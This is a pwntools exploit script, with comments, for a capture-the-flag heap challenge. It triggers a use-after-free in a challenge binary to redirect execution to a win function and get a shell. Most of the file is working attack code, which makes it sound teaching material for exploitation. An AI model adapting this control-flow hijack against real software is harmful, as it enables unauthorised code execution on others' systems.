#!/usr/bin/env python3
from pwn import *

# Before creating the script:

# To start this challenge, I was simply playing around with the binary to find a
# potential use after free or double free exploit. When doing so, I discovered that if
# I created a clone, deleted this clone, and then tried to view the contents of this
# clone, it gave a segmentation fault.

# When debugging this in gdb, I found this happens as it tries to jump to address 
# '0x00'. So, my plan was to attempt to overwrite this address with a more useful
# address. Looking in binary ninja, the binary contains a win function, so I will want
# to jump to this.

# Hence, solving this challenge becomes quite simple, as I simply have to create and
# delete a clone, and then create a second clone which I will set the value of to
# be the win function's address. Then, when I attempt to view the contents of a clone,
# it will jump to this address and pop a shell.

# The script:
PROGNAME = "challenges/./ezpz1"
REMOTEIP = "plsdonthaq.me"
REMOTEPORT = 7001

if args.REMOTE:
    p = remote(REMOTEIP, REMOTEPORT)
    elf = ELF(PROGNAME)
else:
    p = process(PROGNAME)
    elf = p.elf

def menu():
    p.recvuntil("refresh): ")

def create():
    p.sendline("c")
    p.recvuntil("Created new question. ",timeout=0.1)
    index = p.recvline()[-2:-1]
    log.info("Create: {}".format(int(index)))
    menu()
    return index

def delete(index):
    log.info("Delete: {}".format(int(index)))
    p.sendline("d")
    p.recvuntil("question id: ")
    p.sendline(str(index))
    menu()

def setQ(index, name):
    log.info("Set: {} to {}".format(int(index), str(name)))
    p.sendline("s")
    p.recvuntil("question id: ")
    p.sendline(index)
    p.recvuntil("your question: ")
    p.sendline(name)
    menu()

def ask(index):
    log.info("Ask: {}".format(index))
    p.sendline("a")
    p.recvuntil("question id: ")
    p.sendline(str(index))

# First we create and delete a clone.
create()
delete(0)

# Now we create another clone, and set its value to be the address of the win function.
create()
setQ("1", p32(elf.symbols["win"]))

# Now we simply need to view the contents of a clone, which will instead jump to the
# win function.
ask(b"")

# Given we have popped a shell, we can now access the flag.
p.interactive()